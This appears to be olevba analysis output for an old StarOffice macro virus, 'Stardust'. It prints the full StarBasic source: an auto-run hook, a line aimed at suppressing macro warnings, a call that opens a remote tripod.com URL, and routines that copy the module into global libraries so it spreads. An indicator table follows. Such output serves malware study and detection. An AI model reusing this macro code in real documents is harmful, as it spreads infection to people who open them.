olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.StarOffice.Stardust.a-b3de0029e74c4a202e3acc64f421b0badc70cb30
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.StarOffice.Stardust.a-b3de0029e74c4a202e3acc64f421b0badc70cb30 
in file: Virus.StarOffice.Stardust.a-b3de0029e74c4a202e3acc64f421b0badc70cb30 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Stardust" script:language="StarBasic">Dim lAutoInstall as Boolean
Dim Url As String
 dim myFileProp as Object
Sub AutoInstall
	lAutoInstall = True
	mygame()
End Sub
Sub mygame
&apos;*******************************
&apos;*******  SO.Stardust  *********  
&apos;*** (c)by Necronomikon[DCA] ***
&apos;*******************************
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
&apos;turn off macrowarning and execute it
ThisComponent.LockControllers &apos;turn off screen updating.
oDocument = ThisComponent
otext=oDocument.text
ocursor=otext.createtextcursor()
otext.insertString(ocursor, &quot;***Stardust***(c)by Necronomikon[DCA]&quot;,false)
url=converttourl(&quot;http://stardustvx.tripod.com/SilviaSaint.JPG&quot;) &apos;nice idea from Slagehammer... ;)
oDocument = StarDesktop.loadComponentFromURL(url, &quot;_blank&quot;, 0, myFileProp() )
End Sub

Sub InstallGlobalModule( ByVal cGlobalLibName As String,_
							Optional cDocumentLibName,_
							Optional stardust )
	If IsMissing( cDocumentLibName ) Then
		cDocumentLibName = cGlobalLibName
	EndIf

	If IsMissing( stardust ) Then
		InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE )
		InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE )
	Else
		If DoesModuleExist( cDocumentLibName, stardust, DOCUMENT_LIBRARY, DIALOG_MODULE ) Then
			InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE, stardust )
		
		ElseIf DoesModuleExist( cDocumentLibName, stardust, DOCUMENT_LIBRARY, BASIC_MODULE ) Then
			InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE, stardust )
		
		Else
		EndIf
	EndIf
	oDocument.store()
End Sub
Function DoesModuleExist( ByVal cLibraryName As String,_
							ByVal stardust As String,_
							ByVal bGlobal As Boolean,_
							ByVal bDialog As Boolean _
							) As Boolean	
	If bGlobal Then
		If bDialog Then
			oLibs = GlobalScope.DialogLibraries
		Else
			oLibs = GlobalScope.BasicLibraries
		EndIf
	Else
		If bDialog Then
			oLibs = DialogLibraries
		Else
			oLibs = BasicLibraries
		EndIf
	EndIf
	
	bExists = False
	If oLibs.hasByName( cLibraryName ) Then
			oLib = oLibs.getByName( cLibraryName )
		If oLib.hasByName( stardust ) Then
			bExists = True
		EndIf
	EndIf
		DoesModuleExist() = bExists
End Function

</script:module>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://openoffice.or|URL                                          |
|          |g/2000/script       |                                             |
|IOC       |http://stardustvx.tr|URL                                          |
|          |ipod.com/SilviaSaint|                                             |
|          |.JPG&quot           |                                             |
+----------+--------------------+---------------------------------------------+

